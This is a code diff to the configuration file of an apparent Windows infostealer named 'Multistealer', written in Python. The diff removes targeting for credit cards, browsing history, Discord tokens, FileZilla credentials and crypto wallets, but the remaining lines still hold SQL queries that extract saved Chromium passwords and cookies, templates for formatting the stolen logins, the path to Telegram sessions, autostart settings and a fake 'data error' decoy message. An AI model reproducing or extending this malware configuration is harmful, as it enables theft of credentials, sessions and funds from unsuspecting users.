@@ -3,7 +3,6 @@ from os import environ
 from getpass import getuser
 from re import compile, IGNORECASE, DOTALL
 
-
 sys_root = environ.get("SystemRoot", r"C:\Windows")
 user_profile = environ.get("USERPROFILE")
 user = getuser()
@@ -21,37 +20,10 @@ class Browsers(Enum):
 
 
 class ChromiumConfig:
-    BookmarksRegex = compile(
-        r'"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"', IGNORECASE + DOTALL
-    )
-
     PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
     CookiesSQL = "SELECT host_key, name, encrypted_value FROM cookies"
-    CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
-    HistorySQL = "SELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000"
-    HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
-
     PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
     CookiesData = "{0}\tTRUE\t/\tFALSE\t2538097566\t{1}\t{2}"
-    CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
-    HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
-    BookmarksData = "Title: {0}\nUrl: {1}\n\n"
-
-    WalletLogs = [
-        {
-            "name": "Metamask",
-            "folders": [
-                "nkbihfbeogaeaoehlefnkodbefgpgknn",
-                "djclckkglechooblngghdinmeemkbgci",
-                "ejbalbakoplchlghecdalmeeeajnimhm",
-            ],
-        },
-        {"name": "Phantom", "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]},
-        {"name": "Binance", "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]},
-        {"name": "Coinbase", "folders": ["hnfanknocfeofbddgcijnmhnfnkdnaad"]},
-        {"name": "Trust", "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]},
-        {"name": "Exodus", "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]},
-    ]
 
 
 class MultistealerConfig:
@@ -107,57 +79,13 @@ class AutostartConfig:
     )
 
 
-class DiscordConfig:
-    TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
-    UserAgent = user_agent
-    DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"
-
-
 class TelegramConfig:
     SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop"
-
-
-class FileZillaConfig:
-    SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
-    DataFiles = ("recentservers.xml", "sitemanager.xml")
-    FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"
 
 
 class MessageConfig:
     MessageTitle = "0x17"
     MessageDescription = "ERROR_CRC: Data error (cyclic redundancy check)."
-
-
-class WalletsConfig:
-    WalletPaths = [
-        {
-            "name": "Atomic",
-            "path": rf"{user_profile}\AppData\Roaming\atomic\Local Storage\leveldb",
-        },
-        {
-            "name": "Exodus",
-            "path": rf"{user_profile}\AppData\Roaming\Exodus\exodus.wallet",
-        },
-        {
-            "name": "Electrum",
-            "path": rf"{user_profile}\AppData\Roaming\Electrum\wallets",
-        },
-        {
-            "name": "Ethereum",
-            "path": rf"{user_profile}\AppData\Roaming\Ethereum\keystore",
-        },
-        {"name": "Armory", "path": rf"{user_profile}\AppData\Roaming\Armory"},
-        {"name": "Bytecoin", "path": rf"{user_profile}\AppData\Roaming\bytecoin"},
-        {
-            "name": "Guarda",
-            "path": rf"{user_profile}\AppData\Roaming\Guarda\Local Storage\leveldb",
-        },
-        {
-            "name": "Coinomi",
-            "path": rf"{user_profile}\AppData\Local\Coinomi\Coinomi\wallets",
-        },
-        {"name": "Zcash", "path": rf"{user_profile}\AppData\Local\Zcash"},
-    ]
 
 
 class ProtectorConfig:
